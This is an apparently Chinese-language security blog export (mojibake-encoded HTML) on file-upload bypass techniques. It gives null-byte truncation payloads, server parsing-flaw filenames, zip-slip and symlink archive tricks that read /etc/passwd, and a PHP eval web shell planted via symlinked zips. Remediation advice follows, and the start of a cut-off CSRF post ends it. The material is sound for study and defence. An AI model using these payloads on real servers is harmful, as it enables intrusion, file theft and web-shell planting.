id="å›¾ç‰‡ç™½åå•ç»•è¿‡"><a href="#å›¾ç‰‡ç™½åå•ç»•è¿‡" class="headerlink" title="å›¾ç‰‡ç™½åå•ç»•è¿‡"></a>å›¾ç‰‡ç™½åå•ç»•è¿‡</h1><h3 id="00æˆªæ–­"><a href="#00æˆªæ–­" class="headerlink" title="%00æˆªæ–­"></a>%00æˆªæ–­</h3><h4 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h4><ul><li>phpç‰ˆæœ¬&lt;5.3.4</li><li>magic_quotes_gpcå…³é—­</li><li>ä¿å­˜çš„æ–‡ä»¶åå¯æ§</li></ul><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; </span><br></pre></td></tr></table></figure><p>åç«¯ä½¿ç”¨<code>move_uploaded_file</code>æ¥ç§»åŠ¨æ–‡ä»¶ï¼Œ<code>move_uploaded_file</code>å‡½æ•°åº•å±‚ä¸ºcè¯­è¨€ï¼Œé‡åˆ°0x00ä¼šæˆªæ–­ï¼ˆå­—ç¬¦ä¸²ç»“æŸæ ‡å¿—ï¼‰</p><p>Demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?save_path=../upload/shell.php%<span class="number">00</span></span><br><span class="line"></span><br><span class="line">filename=shell.jpg</span><br></pre></td></tr></table></figure><h3 id="æ¡ä»¶ç«äº‰"><a href="#æ¡ä»¶ç«äº‰" class="headerlink" title="æ¡ä»¶ç«äº‰"></a>æ¡ä»¶ç«äº‰</h3><p>Demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">    <span class="comment"># move_uploaded_fileæˆåŠŸåæ‰åˆ¤æ–­æ˜¯å¦åˆæ³•</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æœåŠ¡ç«¯å…ˆå°†ä¸Šä¼ çš„æ–‡ä»¶å†™å…¥ï¼Œå†åˆ¤æ–­æ˜¯å¦åˆæ³•ï¼Œé€šè¿‡æ¡ä»¶ç«äº‰åœ¨æ–‡ä»¶åˆ é™¤å‰è®¿é—®webshellå†™å…¥æ–°çš„webshellå³å¯ã€‚</p><h3 id="è§£ææ¼æ´"><a href="#è§£ææ¼æ´" class="headerlink" title="è§£ææ¼æ´"></a>è§£ææ¼æ´</h3><h4 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h4><ul><li><p>5.x  , 6.0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ–‡ä»¶å¤¹è§£ææ¼æ´</span><br><span class="line">ä¼šå°† *.asp/ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å½“æˆAspè§£æ</span><br></pre></td></tr></table></figure></li><li><p>6.0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># åˆ†å·æˆªæ–­æ¼æ´</span><br><span class="line">é»˜è®¤ä¼šå°† *.asp;.jpg æ­¤ç§æ ¼å¼çš„æ–‡ä»¶åï¼Œå½“æˆAspè§£æï¼ŒåŸç†æ˜¯æœåŠ¡å™¨é»˜è®¤ä¸è§£æ; å·åŠå…¶åé¢çš„å†…å®¹ï¼Œç›¸å½“äºæˆªæ–­ã€‚</span><br></pre></td></tr></table></figure></li></ul><p>ä¿®å¤æ–¹æ¡ˆï¼šIISæœåŠ¡å™¨æœ¬èº«ç¼ºé™·ï¼Œå‡çº§ç‰ˆæœ¬&#x2F;æ‰“è¡¥ä¸</p><h4 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h4><ul><li><p>æ–‡ä»¶ç±»å‹é”™è¯¯è§£ææ¼æ´</p><p>äº§ç”ŸåŸå› ï¼š</p><p><code>FastCGI</code>ä¸<code>PHP</code>å¯¹PATH_INFOå¤„ç†çš„å·®å¼‚ã€‚ </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload</span></span><br><span class="line">/example.gif/.php</span><br></pre></td></tr></table></figure><p>ä¿®å¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åœ¨php.iniä¸­è®¾ç½®fix_pathinfo=0 æˆ–è€…è®¾ç½®security.limit_extensions = .php</span><br><span class="line">æˆ–è€…</span><br><span class="line">åœ¨nginxçš„é…ç½®æ–‡ä»¶ä¸­è®¾ç½®fastcgi_spilt_path_info  ^(.+\.php)(.*)$;</span><br></pre></td></tr></table></figure></li><li><p>ç©ºå­—èŠ‚è§£ææ¼æ´ï¼ˆCVE-2013-4547ï¼‰</p><p>å—å½±å“ç‰ˆæœ¬ï¼š0.841<del>1.4.3&#x2F;1.5.0</del>1.5.7</p><p>äº§ç”ŸåŸå› ï¼š</p><p>nginxé…ç½®ä¸å½“</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line">å½“ç”¨æˆ·è¯·æ±‚info.jpg%00.phpæ—¶ï¼Œå› ä¸ºinfo.jpg%00.phpèƒ½å¤ŸåŒ¹é…æ­£åˆ™&quot;.php$&quot;ï¼Œæ‰€ä»¥å¯ä»¥è¿›å…¥è¯¥<span class="section">location</span>å—ã€‚</span><br><span class="line">ä½†æ˜¯nginxåœ¨è§£ææ–‡ä»¶åæ—¶è¢«%<span class="number">00</span>æˆªæ–­ï¼Œå¯¼è‡´ä»¥ä¸ºè¯·æ±‚çš„æ–‡ä»¶æ˜¯info.jpgå¹¶å‘ç»™fastcgiï¼Œæ‰€ä»¥fastcgiå°±å°†info.jpgå½“ä½œphpæ–‡ä»¶è¿›è¡Œè§£æäº†ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload</span></span><br><span class="line">ä¸Šä¼ æ–‡ä»¶ï¼šinfo.jpg</span><br><span class="line">è¯·æ±‚æ–‡ä»¶ï¼šinfo.jpg%<span class="number">00</span>.php</span><br></pre></td></tr></table></figure><p>ä¿®å¤ï¼šå‡çº§ç‰ˆæœ¬</p></li></ul><h4 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h4><ul><li><p>ä»å·¦åˆ°å³è§£ææ¼æ´</p><p>äº§ç”ŸåŸå› ï¼š</p><p>apacheé…ç½®ä¸å½“</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php</span><br></pre></td></tr></table></figure><p>Apacheä¼šä»å·¦å‘å³å¯»æ‰¾æ‰€æœ‰å¯ä»¥è¢«è¯†åˆ«çš„æ‰©å±•åï¼Œç„¶åä»¥æœ€åä¸€ä¸ªå¯è¯†åˆ«çš„æ‰©å±•åä¸ºå‡†è¿›è¡Œè§£æã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">xxxx.php.xyz</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™æœ€åä¸€ä¸ªå¯è¯†åˆ«çš„æ‰©å±•ä¸º.phpï¼Œä¼šå°†å…¶ä½œä¸ºphpæ–‡ä»¶è¿›è¡Œè§£æï¼Œè½»æ¾ç»•è¿‡<strong>é»‘åå•</strong>ã€‚</p></li><li><p>HTTPDæ¢è¡Œè§£ææ¼æ´</p><p>äº§ç”ŸåŸå› ï¼š</p><p>é…ç½®ä¸­çš„æ­£åˆ™ç¼ºé™·</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;[^ .]+\.php$&quot;</span>&gt;</span><br><span class="line">    SetHandler application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>æ­£åˆ™è¡¨è¾¾å¼ä¸­$ä¸ä»…åŒ¹é…å­—ç¬¦ä¸²ç»“å°¾ä½ç½®ï¼Œä¹Ÿå¯ä»¥åŒ¹é…\n æˆ– \rï¼Œä»è€Œå¯¼è‡´å¯ä»¥ä¸Šä¼ <code>.php\n</code>ç»•è¿‡é»‘åå•æ ¡éªŒï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥è¢«ä½œä¸ºPHPæ–‡ä»¶è§£æã€‚ï¼ˆä¸èƒ½æ˜¯<code>.php\r\n</code>ï¼‰</p></li></ul><p>ä¸Šè¿°æ¼æ´ä¿®å¤ï¼šå› ä¸ºApacheçš„è§£ææ¼æ´æ˜¯ç”±äºç•¸å½¢æ‰©å±•åå’Œç•¸å½¢æ–‡ä»¶åå¯¼è‡´çš„ï¼Œæ‰€ä»¥ä½¿ç”¨ç™½åå•ï¼Œå¹¶å¯¹æ–‡ä»¶é‡å‘½åï¼Œæ–‡ä»¶å°±ä¸ä¼šå­˜åœ¨ç•¸å½¢å­—ç¬¦å’Œå¤šæ‰©å±•åçš„æƒ…å†µã€‚</p><p>å‚è€ƒå¦‚ä¸‹ä»£ç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># $_FILES[&#x27;file&#x27;][&#x27;name&#x27;]ä¼šè‡ªåŠ¨æŠŠæ¢è¡Œå»æ‰</span></span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...å…¶ä»–æ£€æŸ¥</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, [<span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;png&#x27;</span>], <span class="literal">true</span>)) &#123;</span><br><span class="line">        <span class="variable">$new_name</span> = <span class="string">&#x27;./upload/&#x27;</span> . <span class="title function_ invoke__">uniqid</span>() . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$new_name</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="é…åˆæ–‡ä»¶åŒ…å«"><a href="#é…åˆæ–‡ä»¶åŒ…å«" class="headerlink" title="é…åˆæ–‡ä»¶åŒ…å«"></a>é…åˆæ–‡ä»¶åŒ…å«</h3><ul><li><p>å›¾ç‰‡ğŸ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  ç»•è¿‡å®½é«˜æ£€æŸ¥</span></span><br><span class="line"><span class="comment">#define width 1</span></span><br><span class="line"><span class="comment">#define height 1</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator">https://github.com/huntergregal/PNG-IDAT-Payload-Generator</a></p><p>ç”¨æ•°æ®é‡å°çš„å›¾ç‰‡ï¼Œæ¯”å¦‚éšä¾¿æˆªä¸€å¼ å¾ˆå°çš„å›¾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ™®é€šï¼šcopy,ç›´æ¥æ’å…¥</span><br><span class="line">äºŒæ¬¡æ¸²æŸ“ï¼šæ‰¾åˆ°å‰åå›¾ç‰‡ä¸­æ²¡æœ‰å‘ç”Ÿå˜åŒ–çš„hexæ•°æ®ï¼Œæ›¿æ¢ä¸ºæœ¨é©¬</span><br></pre></td></tr></table></figure></li><li><p>æ–‡ä»¶åŒ…å«trick</p></li></ul><h3 id="é…åˆæ–‡ä»¶è¯»å–ååºåˆ—åŒ–"><a href="#é…åˆæ–‡ä»¶è¯»å–ååºåˆ—åŒ–" class="headerlink" title="é…åˆæ–‡ä»¶è¯»å–ååºåˆ—åŒ–"></a>é…åˆæ–‡ä»¶è¯»å–ååºåˆ—åŒ–</h3><p>ä¸Šä¼ ä»»æ„åç¼€çš„pharæ ¼å¼çš„æ–‡ä»¶ï¼Œé…åˆæ–‡ä»¶è¯»å–ç”¨<code>phar://</code>è§£æ</p><h1 id="å‹ç¼©æ–‡ä»¶è§£å‹é—®é¢˜"><a href="#å‹ç¼©æ–‡ä»¶è§£å‹é—®é¢˜" class="headerlink" title="å‹ç¼©æ–‡ä»¶è§£å‹é—®é¢˜"></a>å‹ç¼©æ–‡ä»¶è§£å‹é—®é¢˜</h1><p>æœåŠ¡ç«¯ä¼šå¯¹ä¸Šä¼ çš„å‹ç¼©åŒ…è¿›è¡Œè§£å‹ï¼Œå¯ä»¥æ„é€ æ¶æ„å‹ç¼©åŒ…æ”»å‡»</p><h2 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h2><p>Linuxè½¯é“¾æ¥</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /etc/passwd test</span><br><span class="line">zip -y passwd.zip test  # -y ä¿è¯è§£å‹å‡ºæ¥çš„è¿˜æ˜¯è½¯é“¾æ¥</span><br></pre></td></tr></table></figure><h2 id="ç›®å½•ç©¿è¶Š"><a href="#ç›®å½•ç©¿è¶Š" class="headerlink" title="ç›®å½•ç©¿è¶Š"></a>ç›®å½•ç©¿è¶Š</h2><ul><li><p>é€šè¿‡æ„é€ å‹ç¼©æ–‡ä»¶çš„æ–‡ä»¶åï¼Œé€ æˆç›®å½•ç©¿è¶Š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="comment"># the name of the zip file to generate</span></span><br><span class="line">zf = zipfile.ZipFile(<span class="string">&#x27;out.zip&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="comment"># the name of the malicious file that will overwrite the origial file (must exist on disk)</span></span><br><span class="line">fname = <span class="string">&#x27;sec_test.txt&#x27;</span></span><br><span class="line"><span class="comment">#destination path of the file</span></span><br><span class="line">zf.write(fname, <span class="string">&#x27;../../../../../../../../../../../../../../../../../../../../../../../../tmp/sec_test.tmp&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æ‰€æœ‰å·²å‘ç°å—<code>Zip Slip</code>å½±å“çš„é¡¹ç›®:<a href="https://github.com/snyk/zip-slip-vulnerability">https://github.com/snyk/zip-slip-vulnerability</a></p><p><strong>æ³¨</strong>ï¼šå¦‚æœç”¨çš„æ˜¯å‘½ä»¤<code>unzip</code>æ¥è§£å‹ï¼Œè¿™ç§æ–¹æ³•å°±æ²¡ç”¨äº†ï¼Œå› ä¸º<code>unzip</code> é»˜è®¤è·³è¿‡æ–‡ä»¶åä¸­çš„<code>../</code></p></li><li><p>è½¯é“¾æ¥çš„å¦™ç”¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">åˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥æŒ‡å‘ç½‘ç«™ç›®å½•</span></span><br><span class="line">ln -s /var/www/html test</span><br><span class="line">zip -y 1.zip test</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">åˆ›å»ºä¸€ä¸ªä¸è½¯é“¾æ¥åŒåçš„ç›®å½•ï¼Œå¹¶åœ¨è¯¥ç›®å½•ä¸‹åˆ›å»ºæœ¨é©¬æ–‡ä»¶</span></span><br><span class="line">mkdir a &amp;&amp; cd a </span><br><span class="line">mkdir test</span><br><span class="line">echo &#x27;&lt;?php @eval($_GET[1]); ?&gt;&#x27; &gt; test/shell.php</span><br><span class="line">chmod 777 test/shell.php</span><br><span class="line">zip -r 2.zip test</span><br></pre></td></tr></table></figure><p>ç„¶åå…ˆä¸Šä¼ 1.zipï¼Œè§£å‹å¾—åˆ°è½¯é“¾æ¥<code>test</code>ï¼Œå†ä¸Šä¼ 2.zipï¼Œè§£å‹å¾—åˆ°testç›®å½•å’Œshell.phpï¼Œå› ä¸ºtestæŒ‡å‘&#x2F;var&#x2F;www&#x2F;html,æ‰€ä»¥shell.phpå®é™…ä¸Šæ˜¯è¢«è§£å‹åˆ°ç½‘ç«™ç›®å½•ä¸‹</p></li></ul><h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><p>Fromï¼šä»£ç å®¡è®¡çŸ¥è¯†æ˜Ÿçƒ</p><p>ä¿®æ”¹å‹ç¼©åŒ…äºŒè¿›åˆ¶å­—èŠ‚ï¼Œè®©å‹ç¼©åŒ…è§£å‹è¿‡ç¨‹å‡ºé”™ï¼Œä½†æ˜¯å‡ºé”™å‰å·²è§£å‹éƒ¨åˆ†å³ä¸ºwebshellã€‚ï¼ˆå‡ºé”™åæ•è·å¼‚å¸¸ï¼Œç¨‹åºä¸­æ­¢ï¼Œå¦‚æœå¼€å‘äººå‘˜æ²¡æœ‰å¯¹å·²è§£å‹éƒ¨åˆ†è¿›è¡Œæ ¡éªŒï¼Œé‚£ä¹ˆå·²è§£å‹å‡ºçš„webshellå°±å¯ä»¥ç•™åœ¨æœåŠ¡ç«¯ä¸­ï¼‰</p><p><a href="https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html">https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html</a></p><h1 id="ä¸Šä¼ æ¥å£å¯»æ‰¾"><a href="#ä¸Šä¼ æ¥å£å¯»æ‰¾" class="headerlink" title="ä¸Šä¼ æ¥å£å¯»æ‰¾"></a>ä¸Šä¼ æ¥å£å¯»æ‰¾</h1><ul><li><p>é€šè¿‡è§‚å¯Ÿå‘½åæ¥fuzzæ¥å£</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">uploadImg.cspx</span><br><span class="line">uploadfile.cspx</span><br><span class="line">uploadtest.cspx</span><br><span class="line"></span><br><span class="line">upload_test.cspx</span><br><span class="line">upload_2018.php</span><br><span class="line"></span><br><span class="line">upload2019.php</span><br><span class="line">upload2020.jsp</span><br></pre></td></tr></table></figure></li><li><p>ä¸Šä¼ æ¥å£æµ‹è¯•</p></li></ul><p>From <a href="https://y4er.com/posts/pentest-idea-sharing-file/#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">https://y4er.com/posts/pentest-idea-sharing-file/#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0</a></p><p>![image-20230605161933817](E:\typora img\image-20230605161933817.png)</p><h1 id="ä¸Šä¼ åé—®é¢˜"><a href="#ä¸Šä¼ åé—®é¢˜" class="headerlink" title="ä¸Šä¼ åé—®é¢˜"></a>ä¸Šä¼ åé—®é¢˜</h1><h3 id="æ²¡æœ‰æ‰§è¡Œæƒé™"><a href="#æ²¡æœ‰æ‰§è¡Œæƒé™" class="headerlink" title="æ²¡æœ‰æ‰§è¡Œæƒé™"></a>æ²¡æœ‰æ‰§è¡Œæƒé™</h3><p>å°è¯•ç›®å½•ç©¿è¶Šï¼Œè·³åˆ°å¯ä»¥æ‰§è¡Œè„šæœ¬è¯­è¨€çš„ç›®å½•</p><h3 id="æ–‡ä»¶è·¯å¾„å¯»æ‰¾"><a href="#æ–‡ä»¶è·¯å¾„å¯»æ‰¾" class="headerlink" title="æ–‡ä»¶è·¯å¾„å¯»æ‰¾"></a>æ–‡ä»¶è·¯å¾„å¯»æ‰¾</h3><p>From <a href="https://www.cnblogs.com/yokan/p/15252077.html">https://www.cnblogs.com/yokan/p/15252077.html</a></p><ul><li><p>å› ä¸ºä¼ ä¸Šå»çš„æ–‡ä»¶ï¼Œå¦‚å›¾ç‰‡è¿™ç±»çš„æ€»å½’æ˜¯æ˜¾ç¤ºå‡ºæ¥çš„ï¼Œæ‰€ä»¥å¯ä»¥å…ˆåœ¨webåº”ç”¨åˆ°å¤„ç‚¹ç‚¹ï¼Œå¤šåŠ è½½ä¸€äº›æ•°æ®åŒ…ï¼Œç„¶åå†åˆ°burpçš„http historyæœç´¢shellçš„åå­—</p></li><li><p><strong>è¿”å›äº†ä¸€äº›å‚æ•°ä½†ä¸åŒ…æ‹¬è·¯å¾„çš„æƒ…å†µ</strong>ï¼Œæ¯”å¦‚file_id ç­‰ç­‰ï¼Œé‚£ä¹ˆæ–‡ä»¶è·¯å¾„å¯èƒ½å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå¯ä»¥<strong>ç»“åˆsqlæ³¨å…¥</strong> sqlmapçš„â€“search -Cå‚æ•°æ‰¾åˆ°å­—æ®µå’Œå€¼</p></li><li><p><strong>ä»€ä¹ˆéƒ½æ²¡è¿”å›çš„æƒ…å†µï¼Œåªè¿”å›äº†okï¼Œtrueç­‰ç­‰ã€‚é‡æ–°åŠ è½½ï¼ŒæŠ“åŒ…çœ‹å“åº”ï¼Œæˆ–è®¸æŸä¸ªæ¥å£çš„å“åº”å°±åŒ…æ‹¬å¯¹åº”çš„è·¯å¾„ã€‚</strong></p><p>æ¯”å¦‚å¤´åƒä½ç½®ä¸Šä¼ ä¸Šå»äº†ï¼Œä½†æ˜¯æ²¡æœ‰è¿”å›è·¯å¾„ï¼Œé‚£ä¹ˆæƒ³åŠæ³•è®©ä»–åœ¨åŠ è½½ä¸€éï¼Œæ¯”å¦‚é€€å‡ºé‡æ–°ç™»é™†ï¼Œä¸€ä¸ªåŒ…ä¸€ä¸ªåŒ…çš„æ”¾ã€‚å¯èƒ½æœ‰äº›åŒ…çš„å“åº”ä¸­å°±åŒ…å«è·¯å¾„ã€‚</p><p>   å¦å¤–å¯èƒ½å­˜åœ¨å…¶ä»–æœåŠ¡å™¨ã€æˆ–è€…å…¶ä»–ç«™ç‚¹çš„å…¶ä»–è·¯å¾„ï¼Œä¹Ÿæ˜¯æŠ“åŒ…æŸ¥çœ‹ï¼Œçœ‹ä¸€ä¸‹åŠ è½½è¿‡ç¨‹çš„è·¯å¾„åœ¨å“ªæˆ–è€…çœ‹ä¸€ä¸‹htmlã€js</p><p><a href="https://img2020.cnblogs.com/blog/1964477/202109/1964477-20210910165949941-1026982801.png">![img](E:\typora img\1964477-20210910165949941-1026982801.png)</a></p></li><li><p><strong>å°è¯•è®¿é—®æ—¥å¿—æ–‡ä»¶ï¼Œçœ‹èƒ½å¦å‘ç°ä¸€äº›æ•æ„Ÿç›®å½•æˆ–ä¸Šä¼ ç›®å½•</strong></p></li><li><p><strong>åªè¿”å›äº†æ–‡ä»¶åï¼Œæ²¡æœ‰è·¯å¾„</strong></p><p>ä¸€ç§æ˜¯fuzzï¼Œçœ‹å…¶ä»–åŒç±»å‹æ–‡ä»¶çš„è·¯å¾„ï¼Œf12æˆ–è€…å¦‚æœæœ‰æ–‡ä»¶ä¸‹è½½çš„åœ°æ–¹ï¼Œä¸‹è½½æŠ“åŒ…ï¼Œçœ‹æ–‡ä»¶åœ°å€ã€‚</p><p>å¦ä¸€ç§æ˜¯ å°è¯•ä¸Šä¼ çš„æ—¶å€™<strong>ç›®å½•ç©¿è¶Š</strong>ï¼Œä¸€æ¬¡ä¸€æ¬¡å°è¯•ï¼Œçœ‹èƒ½å¦<strong>ç©¿åˆ°ç«™ç‚¹æ ¹ç›®å½•</strong>æˆ–è€…<strong>çŸ¥é“çš„ç›®å½•ä¸‹é¢</strong>ã€‚ä¿®æ”¹è¡¨å•çš„å…¶ä»–å‚æ•°ã€æˆ–è€…filenameå‚æ•°çš„å€¼</p></li></ul><h1 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h1><ul><li><p>ç™½åå•æœºåˆ¶</p></li><li><p>ä¸Šä¼ æ–‡ä»¶é‡å‘½å</p></li><li><p>éšè—ä¸Šä¼ æ–‡ä»¶è·¯å¾„</p></li><li><p>æ–‡ä»¶å†…å®¹æ ¡éªŒå’Œè¿‡æ»¤</p></li><li><p>é¿å…æ¡ä»¶ç«äº‰ï¼Œå…ˆåˆ¤æ–­æ˜¯å¦åˆæ³•ï¼Œè€Œä¸æ˜¯å…ˆå°†æ–‡ä»¶å†™å…¥å†åˆ¤æ–­æ˜¯å¦åˆæ³•</p></li><li><p>ä¸Šä¼ çš„æ–‡ä»¶ç»Ÿä¸€æ”¾åˆ°ä¸€ä¸ªåœ°æ–¹ï¼Œéµå¾ªä»¥ä¸‹åŸåˆ™</p><p><code>ç›®å½•å¯å†™ä½†ä¸å¯è§£æï¼Œå¯è§£æä½†ä¸å¯å†™å…¥</code></p><p>æˆ–è€…ä¸Šä¼ åˆ°ä¸“é—¨ç”¨æ¥ä¿å­˜æ–‡ä»¶çš„åœ°æ–¹ï¼Œå¦‚å­˜å‚¨OSS</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CSRFå’ŒSSRF</title>
      <link href="/2023/05/31/CSRF%E5%92%8CSSRF/"/>
      <url>/2023/05/31/CSRF%E5%92%8CSSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>æ”»å‡»è€…ä¼ªé€ ç”¨æˆ·çš„è¯·æ±‚ï¼Œè¯±å¯¼ç”¨æˆ·ç‚¹å‡»æ¶æ„é“¾æ¥ï¼Œåˆ©ç”¨ç”¨æˆ·çš„cookieè®©æœåŠ¡å™¨ä»¥ä¸ºæ˜¯ç”¨æˆ·æ“ä½œï¼Œä»è€Œå‘èµ·æ”»å‡»ã€‚</p><p><img src="/../images/image-20230321141146612.png" alt="image-20230321141146612"></p><h2 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h2><p>webåº”ç”¨ç¨‹åºåœ¨ç”¨æˆ·è¿›è¡Œæ•æ„Ÿæ“ä½œæ—¶ï¼Œæ²¡æœ‰è¿›è¡Œèº«ä»½éªŒè¯ï¼Œä»è€Œå¯¼è‡´æ¶æ„æ”»å‡»è€…åˆ©ç”¨æ™®é€šç”¨æˆ·çš„èº«ä»½ï¼ˆcookieï¼‰å®Œæˆæ”»å‡»è¡Œä¸ºã€‚</p><h2 id="æ¼æ´å±å®³"><a href="#æ¼æ´å±å®³" class="headerlink" title="æ¼æ´å±å®³"></a>æ¼æ´å±å®³</h2><p>ä¼ªé€ ç”¨æˆ·è¯·æ±‚ï¼Œç”¨æˆ·èƒ½åšå•¥ï¼Œè¿™ä¸ªæ¼æ´å°±èƒ½åšå•¥</p><h2 id="æ¼æ´æ£€æµ‹"><a href="#æ¼æ´æ£€æµ‹" class="headerlink" title="æ¼æ´æ£€æµ‹"></a>æ¼æ´æ£€æµ‹</h2><ul><li>æ•°æ®åŒ…æ— tokenå’ŒrefereréªŒè¯</li></ul><p>æ— tokenéªŒè¯å¹¶ä¸”æ— refereréªŒè¯æ—¶ï¼Œå°±åŸºæœ¬å­˜åœ¨è·¨ç«™è¯·æ±‚ä¼ªé€ 